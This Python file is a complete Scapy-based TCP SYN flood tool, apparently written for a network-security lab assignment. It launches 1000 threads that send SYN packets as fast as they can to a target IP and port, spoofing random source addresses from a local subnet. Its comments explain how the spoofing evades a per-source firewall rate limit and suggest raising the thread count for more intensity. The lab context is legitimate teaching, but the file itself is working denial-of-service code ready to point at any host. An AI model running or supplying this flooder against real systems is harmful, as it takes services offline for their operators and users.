#!/usr/bin/env python3

import sys
import time # Added for the main loop's sleep
from threading import Thread
# Import necessary Scapy modules
from scapy.all import IP, TCP, send, conf, RandShort, RandIP, L3RawSocket

# --- Configuration ---
# Suppress Scapy's verbose output (e.g., "Sent 1 packets.")
conf.verb = 0
# Try using Scapy's L3RawSocket for potentially better performance/control
# This attempts to use Scapy's own raw socket implementation for sending Layer 3 packets.
try:
    conf.L3socket = L3RawSocket
except Exception as e:
    # This might fail on some systems/Scapy versions, but it's a good optimization to try.
    print(f"[!] Warning: Could not set L3RawSocket. Using default. Error: {e}")


# Global variable to hold target information, accessible by threads
target_ip_global = ""
target_port_global = 0
# The local subnet from which we'll spoof source IPs.
# This makes the spoofed packets appear to originate from the local network.
# Based on the assignment's IPs like 192.168.124.20 (server) and .10 (client).
LOCAL_SUBNET = "192.168.124.0/24"


def syn_flood_worker():
    """
    This function is executed by each thread.
    It continuously sends SYN packets with spoofed source IPs (from local subnet) and ports.
    """
    global target_ip_global, target_port_global, LOCAL_SUBNET

    # The print statement below is commented out to maximize speed.
    # Uncomment if you want to see each thread announce its start (can be very noisy).
    # print(f"[*] Thread started: Flooding {target_ip_global}:{target_port_global}...")
    
    while True:
        try:
            # --- Craft the IP Layer ---
            # Source IP: Randomly generated from the LOCAL_SUBNET.
            # Destination IP: The target server's IP.
            # IP ID: Randomly generated for each packet to add variability.
            ip_layer = IP(src=RandIP(LOCAL_SUBNET), dst=target_ip_global, id=RandShort())

            # --- Craft the TCP Layer ---
            # Source Port (sport): Randomly generated.
            # Destination Port (dport): The target server's port.
            # Flags: "S" for SYN packet (initiates a connection).
            # Sequence Number (seq): Random initial sequence number.
            # Window size: Random TCP window size.
            tcp_layer = TCP(sport=RandShort(), dport=target_port_global, flags="S", seq=RandShort(), window=RandShort())

            # Combine IP and TCP layers to form the packet
            packet = ip_layer / tcp_layer

            # Send the packet at Layer 3. Scapy/OS will handle Layer 2.
            # verbose=False is used here, though conf.verb=0 sets it globally.
            send(packet, verbose=False)
            
            # No sleep: each thread sends as fast as possible.
            # The firewall limits per unique spoofed source IP, not the total output from our machine.

        except Exception as e:
            # Suppress errors within worker threads to ensure the flood continues.
            # If threads are dying unexpectedly, uncomment the print below for debugging.
            # print(f"[!] Error in thread: {e}")
            pass # Continue flooding

def main():
    global target_ip_global, target_port_global # Allow main to set these for worker threads

    # --- Step 1/4: Script Setup and Argument Parsing ---
    if len(sys.argv) != 3:
        print("Usage: python3 syn_flood.py <target_ip> <target_port>")
        print("Example: python3 syn_flood.py 192.168.124.20 80")
        sys.exit(1)

    target_ip_global = sys.argv[1]
    try:
        target_port_global = int(sys.argv[2])
        if not (0 < target_port_global < 65536): # Validate port range
            raise ValueError("Port number must be between 1 and 65535.")
    except ValueError as e:
        print(f"Error: Invalid target port '{sys.argv[2]}'. {e}")
        sys.exit(1)

    print(f"[*] Target IP: {target_ip_global}")
    print(f"[*] Target Port: {target_port_global}")
    print(f"[*] Spoofing source IPs from subnet: {LOCAL_SUBNET}")

    # --- Step 3/4: Main Logic - Thread Creation and Execution ---
    # Number of concurrent threads sending packets.
    # This is a key parameter to tune. Start high.
    # If 1000 is still not enough, you could try 1500 or 2000,
    # but be mindful of the attacker machine's resources and Python's threading limits.
    num_threads = 1000 # Increased for higher intensity
    threads = []

    print(f"[*] Starting {num_threads} threads for SYN flood...")
    for i in range(num_threads):
        thread = Thread(target=syn_flood_worker)
        # daemon=True means threads will exit when the main program exits.
        thread.daemon = True 
        threads.append(thread)
        thread.start()

    print(f"[*] SYN Flood attack started. Target: {target_ip_global}:{target_port_global}. Press Ctrl+C to stop.")

    # Keep the main thread alive. Worker threads (daemons) will continue running.
    try:
        while True:
            # The main thread doesn't do much here.
            # time.sleep(1) reduces CPU usage of this waiting loop.
            time.sleep(1) 
    except KeyboardInterrupt:
        print("\n[!] SYN Flood attack terminated by user (Ctrl+C).")
        # Daemon threads will be stopped automatically when the main program exits.
        sys.exit(0)

if __name__ == "__main__":
    # This script is intended to be run inside the attacker container,
    # which should have the necessary network privileges (e.g., CAP_NET_RAW
    # or running as root within the container) for Scapy's raw socket operations.
    main()
